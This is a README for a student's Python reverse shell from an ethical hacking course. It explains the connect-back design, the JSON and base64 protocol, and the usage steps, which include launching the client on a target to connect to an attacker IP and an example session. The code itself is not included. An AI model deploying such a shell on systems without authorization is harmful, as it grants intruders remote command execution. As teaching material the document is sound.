# Python Reverse Shell

> A minimal **reverse shell** in pure Python: a listener/handler on the attacker
> side and a connect-back client on the target side, communicating over TCP with
> a small JSON protocol.

![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![Dependencies](https://img.shields.io/badge/dependencies-standard%20library-green)
![License](https://img.shields.io/badge/license-MIT-brightgreen)

> [!WARNING]
> **For education and authorized testing only.** A reverse shell grants remote
> command execution on the machine that runs the client. Only deploy it on
> systems you own or have **explicit written permission** to test. See the
> [disclaimer](#disclaimer).

---

## Overview

A **reverse shell** flips the usual direction of a connection. Instead of the
attacker connecting *in* to the target (which firewalls usually block), the
**target connects out** to the attacker, who is already listening. Outbound
connections are far more likely to be allowed, which is why reverse shells are a
staple of post-exploitation.

This project has two halves:

| File | Runs on | Role |
|------|---------|------|
| [`server.py`](server.py)   | Attacker | Listens for the incoming connection and gives the operator an interactive prompt to type commands. |
| [`revshell.py`](revshell.py) | Target   | Connects back to the attacker, runs each command it receives, and streams the output back. |

---

## How it works

1. **The attacker listens.** `server.py` binds to a chosen IP on port `4444` and
   waits for a connection.
2. **The target connects back.** `revshell.py` repeatedly tries to reach the
   attacker's IP, retrying every 5 seconds until the listener is up.
3. **Commands flow over a JSON protocol.** Each message is a small JSON object.
   The server sends `{"cmd": "<command>"}`; the client runs it and replies with
   `{"cwd": "<path>", "output": "<base64>"}`.
   - **Command output is base64-encoded** inside the JSON so that binary bytes or
     odd characters can't corrupt the message framing.
   - The client's prompt always reflects the **current working directory** on the
     target.
4. **`cd` is stateful.** A normal `subprocess` call can't change the parent's
   directory, so `cd` is special-cased to call `os.chdir()` directly — meaning
   `cd` persists across commands, just like a real shell.
5. **Clean exit.** Typing `exit` or `quit` tells the client to shut down and both
   sides close their sockets gracefully.

```
   Attacker (server.py)                      Target (revshell.py)
   ────────────────────                      ────────────────────
   listen on :4444                                    │
        ▲                                              │ connect back
        └──────────────── TCP ─────────────────────────┘
   type command  ──▶  {"cmd": "..."}  ──▶  run in shell
   print output  ◀──  {"cwd","output"} ◀── base64(stdout+stderr)
```

---

## Requirements

- **Python 3.10+** (uses `tuple[bytes, str]` style type hints)
- **No third-party dependencies** — standard library only.

---

## Usage

> Run both ends on machines/VMs on the same network (e.g. a Kali attacker and a
> target VM). Port `4444` is hardcoded.

**1. Start the listener on the attacker machine:**

```bash
python3 server.py
# Listen on IP: 0.0.0.0        (or the attacker's LAN IP)
```

**2. Start the client on the target machine:**

```bash
python3 revshell.py
# Connect to IP: <attacker_ip>
```

**3. Once connected, drive it from the server prompt:**

```
Listening...
Connection from ('192.168.1.20', 51514) established.
/home/user $ whoami
user
/home/user $ cd /tmp
/tmp $ ls
...
/tmp $ exit
```

Type `exit` or `quit` to end the session cleanly.

---

## Design notes

- **JSON message framing** keeps the two ends in sync and makes the protocol easy
  to read and extend.
- **Base64-wrapped output** means the shell handles command output that contains
  newlines, non-UTF-8 bytes, or JSON metacharacters without breaking.
- **Automatic reconnect** on the client (5-second retry loop) means the target
  can be started before the listener is ready.
- **Graceful teardown** — connection resets and broken pipes are caught on both
  ends so neither side crashes when the other disappears.

## Limitations

- The channel is **plaintext TCP** — there is no encryption or authentication.
  This is intentional for a teaching example; a real implementation would wrap the
  socket in TLS.
- Port and some behavior are hardcoded to keep the example readable.

---

## Disclaimer

This project was written for the **CSCI369 Ethical Hacking** course as an
educational demonstration of how reverse shells work. It is provided for learning
and for **authorized** security testing only. The author accepts no liability for
misuse. Do not deploy it on any system you do not own or lack explicit permission
to test.

## Author

**Ong Jun Han** — CSCI369 Ethical Hacking

## License

Released under the [MIT License](LICENSE).
